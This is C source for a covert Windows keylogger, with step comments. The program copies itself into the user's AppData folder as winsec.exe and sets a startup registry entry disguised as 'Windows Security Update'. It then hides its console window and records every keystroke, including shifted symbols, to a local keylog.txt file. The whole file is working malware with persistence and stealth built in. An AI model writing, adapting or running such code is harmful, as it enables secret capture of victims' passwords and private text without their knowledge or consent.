#include <stdio.h>
#include <windows.h>
#include <shlobj.h> // for SHGetFolderPath
#include <string.h>

// 🔐 Step 1: Copy itself to %APPDATA%\winsec.exe
void copyToAppData(char* destPath) {
    char sourcePath[MAX_PATH];
    GetModuleFileName(NULL, sourcePath, MAX_PATH);

    FILE *src = fopen(sourcePath, "rb");
    FILE *dest = fopen(destPath, "wb");

    if (src == NULL || dest == NULL) return;

    char buffer[1024];
    size_t bytes;

    while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
        fwrite(buffer, 1, bytes, dest);
    }

    fclose(src);
    fclose(dest);
}

// 🧬 Step 2: Register for startup via Registry
void addToStartup(const char* exePath) {
    HKEY hKey = NULL;
    const char* runKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "Windows Security Update";  // disguise name

    if (RegOpenKeyEx(HKEY_CURRENT_USER, runKeyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

// 🧠 Modifier checks
int isCapsLockOn() {
    return (GetKeyState(VK_CAPITAL) & 0x0001);
}

int isShiftPressed() {
    return (GetAsyncKeyState(VK_SHIFT) & 0x8000);
}

// 🔡 Convert keycode to real char
char translateKey(int vkCode) {
    int shift = isShiftPressed();
    int caps = isCapsLockOn();

    if (vkCode >= 'A' && vkCode <= 'Z') {
        if ((caps && !shift) || (!caps && shift))
            return vkCode;
        else
            return vkCode + 32;
    }

    if (vkCode >= '0' && vkCode <= '9') {
        if (!shift) return vkCode;
        switch (vkCode) {
            case '1': return '!'; case '2': return '@'; case '3': return '#';
            case '4': return '$'; case '5': return '%'; case '6': return '^';
            case '7': return '&'; case '8': return '*'; case '9': return '(';
            case '0': return ')';
        }
    }

    switch (vkCode) {
        case VK_SPACE: return ' ';
        case VK_RETURN: return '\n';
        case VK_TAB: return '\t';
    }

    return 0;
}

// 🔁 Main Program
int main() {
    // 🌐 Step 1: Copy to %APPDATA%
    char appDataPath[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    strcat(appDataPath, "\\winsec.exe");

    // If we're not already in AppData, copy & run from there
    char currentPath[MAX_PATH];
    GetModuleFileName(NULL, currentPath, MAX_PATH);
    if (strcmp(currentPath, appDataPath) != 0) {
        copyToAppData(appDataPath);
        ShellExecute(NULL, "open", appDataPath, NULL, NULL, SW_HIDE);
        return 0;
    }

    // Step 2: Register for startup
    addToStartup(appDataPath);

    // Step 3: Hide Console
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    // Step 4: Start logging
    FILE *file;
    char ch;

    while (1) {
        Sleep(10);
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 1) {
                file = fopen("keylog.txt", "a+");
                if (file == NULL) continue;

                ch = translateKey(key);
                if (ch != 0) {
                    fputc(ch, file);
                } else {
                    switch (key) {
                        case VK_BACK: fprintf(file, "[BACK]"); break;
                        case VK_SHIFT: fprintf(file, "[SHIFT]"); break;
                        case VK_CONTROL: fprintf(file, "[CTRL]"); break;
                        case VK_ESCAPE: fprintf(file, "[ESC]"); break;
                        default: fprintf(file, "[%d]", key); break;
                    }
                }

                fclose(file);
            }
        }
    }

    return 0;
}
